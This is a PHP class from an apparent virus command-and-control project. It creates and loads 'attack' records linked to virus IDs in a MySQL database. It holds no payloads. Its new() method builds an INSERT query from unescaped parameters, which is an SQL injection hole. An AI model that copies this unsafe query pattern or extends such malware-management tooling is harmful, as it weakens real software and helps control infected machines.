<?php


namespace Kelvinho\Virus\Attack;


use Kelvinho\Virus\Id\IdGenerator;
use Kelvinho\Virus\Network\RequestData;
use Kelvinho\Virus\Network\Session;
use Kelvinho\Virus\Singleton\Logs;
use Kelvinho\Virus\Usage\UsageFactory;
use Kelvinho\Virus\User\UserFactory;
use Kelvinho\Virus\Virus\VirusFactory;
use mysqli;

/**
 * Class AttackFactory
 *
 * @package Kelvinho\Virus\Attack
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class AttackFactoryImp implements AttackFactory {
    private RequestData $requestData;
    private Session $session;
    private UserFactory $userFactory;
    private VirusFactory $virusFactory;
    private IdGenerator $idGenerator;
    private mysqli $mysqli;
    private PackageRegistrar $packageRegistrar;
    private UsageFactory $usageFactory;

    public function __construct() {
    }

    public function addContext(RequestData $requestData, Session $session, UserFactory $userFactory, VirusFactory $virusFactory, IdGenerator $idGenerator, mysqli $mysqli, PackageRegistrar $packageRegistrar, UsageFactory $usageFactory) {
        $this->requestData = $requestData;
        $this->session = $session;
        $this->userFactory = $userFactory;
        $this->virusFactory = $virusFactory;
        $this->idGenerator = $idGenerator;
        $this->mysqli = $mysqli;
        $this->packageRegistrar = $packageRegistrar;
        $this->usageFactory = $usageFactory;
    }

    /**
     * Creates a new attack.
     *
     * @param string $virus_id The virus id
     * @param string $attack_package The attack package name
     * @param string $name The attack name
     * @return AttackBase The attack
     * @throws AttackPackageNotFound if the attack package doesn't exist
     */
    public function new(string $virus_id, string $attack_package, string $name): AttackBase {
        if (!$this->packageRegistrar->hasPackage($attack_package)) throw new AttackPackageNotFound();
        $attack_id = $this->idGenerator->newAttackId();
        $classname = $this->packageRegistrar->getClassName($attack_package);
        $usage = $this->usageFactory->new();

        mkdir(DATA_DIR . "/attacks/$attack_id");
        touch(DATA_DIR . "/attacks/$attack_id/profile.txt");
        touch(DATA_DIR . "/attacks/$attack_id/state.json");

        $attack = new $classname();
        /** @var AttackBase $attack */
        $attack->setContext($this->requestData, $this->session, $this->userFactory, $this->virusFactory, $this, $this->mysqli, $this->packageRegistrar, $this->usageFactory);
        $attack->setAttackId($attack_id)->setVirusId($virus_id)->setPackageDbName($attack_package)->setName($name);

        if (!$this->mysqli->query("insert into attacks (attack_id, virus_id, attack_package, resource_usage_id) values ('$attack_id', '$virus_id', '$attack_package', " . $usage->getId() . ")")) Logs::mysql($this->mysqli);
        $attack->saveState();
        $attack = $this->get($attack_id);
        return $attack;
    }

    /**
     * Get an attack when given an attack id.
     *
     * @param string $attack_id The attack id
     * @return AttackBase The attack
     */
    public function get(string $attack_id): AttackBase {
        if (!$answer = $this->mysqli->query("select attack_package from attacks where attack_id = '" . $this->mysqli->escape_string($attack_id) . "'")) throw new AttackNotFound();
        if (!$row = $answer->fetch_assoc()) throw new AttackNotFound();

        $packageDbName = $row["attack_package"];
        if (!$this->packageRegistrar->hasPackage($packageDbName)) throw new AttackPackageNotFound();
        $classname = $this->packageRegistrar->getClassName($packageDbName);
        /** @var AttackBase $attack */
        $attack = new $classname();

        $attack->setContext($this->requestData, $this->session, $this->userFactory, $this->virusFactory, $this, $this->mysqli, $this->packageRegistrar, $this->usageFactory);
        $attack->setAttackId($attack_id)->loadState();
        return $attack;
    }

    /**
     * Checks whether an attack id exists or not.
     *
     * @param string $attack_id The attack id
     * @return bool Whether it exists or not
     */
    public function exists(string $attack_id): bool {
        if (!$answer = $this->mysqli->query("select attack_id from attacks where attack_id = '" . $this->mysqli->escape_string($attack_id) . "'")) return false;
        if (!$row = $answer->fetch_assoc()) return false;
        return true;
    }
}
